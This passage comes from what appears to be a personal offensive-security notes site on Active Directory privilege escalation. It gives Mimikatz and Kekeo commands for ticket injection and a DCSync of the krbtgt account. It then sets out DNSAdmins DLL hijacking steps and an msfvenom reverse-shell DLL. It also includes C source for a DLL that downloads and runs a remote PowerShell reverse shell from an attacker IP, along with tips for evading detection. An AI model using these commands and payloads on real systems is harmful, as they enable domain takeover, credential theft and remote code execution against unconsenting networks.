class="n">domain</span><span class="p">.</span><span class="n">LOCAL</span>
</span></code></pre></div></li>
<li>Inject the ticket
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::ptt TGS_Administrator@lab.domain.local@LAB.DOMAIN.LOCAL_cifs~domain-aimsvc.LAB.DOMAIN.LOCAL@LAB.DOMAIN.LOCAL.kirbi&quot;&#39;</span>
</span></code></pre></div></li>
<li>Using asktgt from Kekeo, we request a TGT (MACHINE ACCOUNT)
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="p">.\</span><span class="n">kekeo</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">aimavc</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">lab</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span> <span class="n">rc4</span><span class="p">:</span><span class="n">00000000000000000000000000000000</span>
</span></code></pre></div></li>
<li>Using s4u from Kekeo (MACHINE ACCOUNT)
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="p">:</span><span class="n">TGT_lab-aimsrv</span><span class="p">$</span><span class="nv">@LAB</span><span class="p">.</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL_krbtgt</span><span class="p">~</span><span class="n">lab</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="nv">@LAB</span><span class="p">.</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span><span class="nv">@lab</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">time</span><span class="p">/</span><span class="n">dc01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">|</span><span class="n">ldap</span><span class="p">/</span><span class="n">dc01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">LOCAL</span>
</span></code></pre></div></li>
<li>Inject the ticket
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::ptt TGS_Administrator@lab.domain.local@LAB.DOMAIN.LOCAL_ldap~domain-aimsvc.LAB.DOMAIN.LOCAL@LAB.DOMAIN.LOCAL.kirbi&quot;&#39;</span>
</span></code></pre></div></li>
<li>DCSync
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;lsadump::dcsync /user:domain\krbtgt&quot;&#39;</span>
</span></code></pre></div></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr />
<h4 id="dns-admin-pe">DNS ADMIN PE</h4>
<p>Main objective : Inject evil DLL and restart DNS service, it is possible to upload the DLL in target server, or you can point the configuration to your SMB share.
- Enumerate the members of the DNSAdmis group
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="nb">Get-NetGroupMember</span> <span class="n">-GroupName</span> <span class="s2">&quot;DNSAdmins&quot;</span>
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="nb">Get-ADGroupMember</span> <span class="n">-Identity</span> <span class="n">DNSAdmins</span>
</span></code></pre></div>
- Hunt the DNSAdmins account or grant yourself in DNSAdmins group member, upload and load your DLL
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="c"># dnscmd.exe</span>
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="n">dnscmd</span> <span class="n">DC01</span> <span class="p">/</span><span class="n">config</span> <span class="p">/</span><span class="n">serverlevelplugindll</span> <span class="p">\\</span><span class="n">YOURSMBSRV</span><span class="p">\</span><span class="n">SHARE</span><span class="p">\</span><span class="n">mimilib</span><span class="p">.</span><span class="n">dll</span>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="c"># DNSServer module</span>
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="nv">$dnsettings</span> <span class="p">=</span> <span class="nb">Get-DnsServerSetting</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-Verbose</span> <span class="n">-All</span>
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="nv">$dnsettings</span><span class="p">.</span><span class="n">ServerLevelPluginDll</span> <span class="p">=</span> <span class="s2">&quot;\\YOURSMBSRV\SHARE\mimilib.dll&quot;</span> <span class="nb">Set-DnsServerSetting</span> <span class="n">-InputObject</span> <span class="nv">$dnsettings</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-Verbose</span>
</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="c"># CHECK REGISTRY VALUE FOR ServerLevelPluginDll</span>
</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="nb">Get-ItemProperty</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">DNS</span><span class="p">\</span><span class="n">Parameters</span><span class="p">\</span> <span class="n">-Name</span> <span class="n">ServerLevelPluginDll</span>
</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a><span class="c">#</span>
</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a><span class="nb">sc </span><span class="p">\\</span><span class="n">DC01</span> <span class="n">stop</span> <span class="n">dns</span>
</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a><span class="nb">sc </span><span class="p">\\</span><span class="n">DC01</span> <span class="n">stop</span> <span class="n">dns</span>
</span></code></pre></div></p>
<p><span style="color:red">If you drop a local MSF DLL, you will be spotted</span>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>YourIP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>YourPort<span class="w"> </span>-f<span class="w"> </span>dll<span class="w"> </span>&gt;<span class="w"> </span>dns.dll
</span></code></pre></div>
<span style="color:green">If you point a MSF DLL to your SMB share, it seems that you will not be spotted (lab test)</span></p>
<p><b>To avoid any risk of detection about your DLL, it is better to make your own !!!</b></p>
<p>Use your Kali and cross-compile your DLL to get a NT AUTHORITY\SYSTEM reverse shell.</p>
<p><div class="language-c highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1">//dns.c</span>
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="n">BOOL</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">DllMain</span><span class="w"> </span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hDll</span><span class="p">,</span><span class="w"> </span><span class="n">DWORD</span><span class="w"> </span><span class="n">dwReason</span><span class="p">,</span><span class="w"> </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpReserved</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dwReason</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;powershell -c IEX(New-Object Net.Webclient).downloadString(&#39;http://10.10.10.10/revshell_FUD.ps1&#39;)&quot;</span><span class="p">);</span>
</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="w">        </span><span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a><span class="p">}</span>
</span></code></pre></div>
- CROSS COMPILING
<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># Compiling a 64bit DLL</span>
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>x86_64-w64-mingw32-gcc<span class="w"> </span>dns.c<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>dns.dll
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="c1"># Compiling a 32bit DLL</span>
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>i686-w64-mingw32-gcc<span class="w"> </span>dns.c<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>dns.dll
</span></code></pre></div></p>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/privesc.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>